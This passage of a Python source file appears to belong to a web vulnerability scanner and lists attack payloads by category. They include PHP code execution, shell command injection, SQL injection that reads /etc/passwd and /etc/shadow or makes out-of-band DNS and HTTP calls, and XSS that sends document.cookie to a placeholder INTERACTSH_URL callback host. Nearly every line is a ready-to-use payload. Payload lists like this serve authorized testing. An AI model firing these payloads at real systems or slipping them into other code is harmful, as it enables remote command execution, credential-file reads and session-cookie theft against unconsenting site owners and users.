        "<?php system('id'); ?>",
        "<?php echo shell_exec('id'); ?>",
        "<?php passthru('id'); ?>",
        "<?php exec('id'); ?>",
        "<?php `id`; ?>",
        "<?php system('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php echo shell_exec('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php passthru('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php exec('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php `curl http://INTERACTSH_URL/$(whoami)`; ?>",
    ],
    "command_injection": [
        "`id`",
        "$(id)",
        "; id",
        "& id",
        "| id",
        "&& id",
        "|| id",
        "`curl http://INTERACTSH_URL/`whoami``",
        "$(curl http://INTERACTSH_URL/`whoami`)",
        "; curl http://INTERACTSH_URL/`whoami`",
        "& curl http://INTERACTSH_URL/`whoami`",
        "| curl http://INTERACTSH_URL/`whoami`",
        "&& curl http://INTERACTSH_URL/`whoami`",
        "|| curl http://INTERACTSH_URL/`whoami`",
    ],
    "sql_injection": [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT UNHEX(HEX(@@HOSTNAME))), '.INTERACTSH_URL\\\\', 'abc'))--",
        "' UNION SELECT UTL_HTTP.REQUEST('http://INTERACTSH_URL') FROM DUAL--",
        "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL') FROM DUAL--",
        "COPY (SELECT '') TO PROGRAM 'nslookup INTERACTSH_URL'--",
        "' UNION SELECT pg_sleep(1), pg_read_file('http://INTERACTSH_URL/')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/passwd')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/shadow')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/hosts')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/issue')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/motd')--",
    ],
    "xss": [
        "<img src=x onerror=\"fetch('http://INTERACTSH_URL/'+document.cookie)\">",
        "<img src=x onerror=\"new Image().src='http://INTERACTSH_URL/'+document.cookie\">",
        "<img src=x onerror=\"var x=new XMLHttpRequest();x.open('GET','http://INTERACTSH_URL/'+document.cookie);x.send();\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+document.cookie;\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+btoa(document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie+':'+document.location);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie+':'+document.location+':'+document.referrer);\">",
    ],
}

# Add other categories as needed: SSRF, Header Injection, NoSQL Injection, LFI specific variations etc.